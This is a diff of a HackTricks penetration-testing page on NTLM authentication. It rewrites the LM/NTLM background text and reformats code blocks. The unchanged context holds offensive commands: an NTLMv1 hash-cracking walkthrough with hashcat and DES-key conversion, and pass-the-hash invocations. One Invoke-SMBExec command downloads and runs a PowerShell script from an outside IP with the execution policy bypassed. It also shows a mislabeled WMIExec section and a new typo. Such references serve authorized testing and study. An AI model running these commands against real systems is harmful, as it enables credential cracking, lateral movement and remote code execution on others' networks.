@@ -7,22 +7,26 @@
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Basic Information
 
-**NTLM Credentials**: Domain name (if any), username and password hash.
+In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.
 
-**LM** is only **enabled** in **Windows XP and server 2003** (LM hashes can be cracked). The LM hash AAD3B435B51404EEAAD3B435B51404EE means that LM is not being used (is the LM hash of empty string).
+By default, the **Kerberos** authentication protocol is the primary method used. NTLM (NT LAN Manager) steps in under specific circumstances: absence of Active Directory, non-existence of the domain, malfunctioning of Kerberos due to improper configuration, or when connections are attempted using an IP address rather than a valid hostname.
 
-By default **Kerberos** is **used**, so NTLM will only be used if **there isn't any Active Directory configured,** the **Domain doesn't exist**, **Kerberos isn't working** (bad configuration) or the **client** that tries to connect using the IP instead of a valid host-name.
+The presence of the **"NTLMSSP"** header in network packets signals an NTLM authentication process.
 
-The **network packets** of a **NTLM authentication** have the **header** "**NTLMSSP**".
+Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitated by a specific DLL located at `%windir%\Windows\System32\msv1\_0.dll`.
 
-The protocols: LM, NTLMv1 and NTLMv2 are supported in the DLL %windir%\Windows\System32\msv1\_0.dll
+**Key Points**:
+- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
+- Kerberos is the default authentication method, with NTLM used only under certain conditions.
+- NTLM authentication packets are identifiable by the "NTLMSSP" header.
+- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
 
 ## LM, NTLMv1 and NTLMv2
 
@@ -97,12 +101,12 @@ Remember that the printer will use the computer account during the authenticatio
 NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.
 
 The command
-```
+```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
 would output the below:
 
-```
+```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
 Hostname: DUSTIN-5AA37877
@@ -129,19 +133,19 @@ NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 
 Create a file with the contents of:
-```
+```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
 
 Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
 
-```
+```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
 
 In this case we know the password to this is password so we are going to cheat for demo purposes:
-```
+```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
 DESKEY2: bcba83e6895b9d
@@ -151,7 +155,8 @@ echo bcba83e6895b9d>>des.cand
 ```
 
 We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
-```
+
+```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
 
@@ -159,15 +164,17 @@ b4b9b02e6f09a9 # this is part 1
 bd760f388b6700 # this is part 2
 ```
 
-finally the last part
-```
+Ginally the last part:
+
+```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
 
-combine them together
-```
+Combine them together:
+
+```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
 
@@ -218,25 +225,25 @@ You can get the powershell scripts from here: [https://github.com/Kevin-Robertso
 
 #### Invoke-SMBExec
 
-```
+```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
 
 #### Invoke-WMIExec
 
-```
+```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
 
 #### Invoke-SMBClient
 
-```
+```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
 
 #### Invoke-SMBEnum
 
-```
+```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
 
@@ -289,7 +296,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
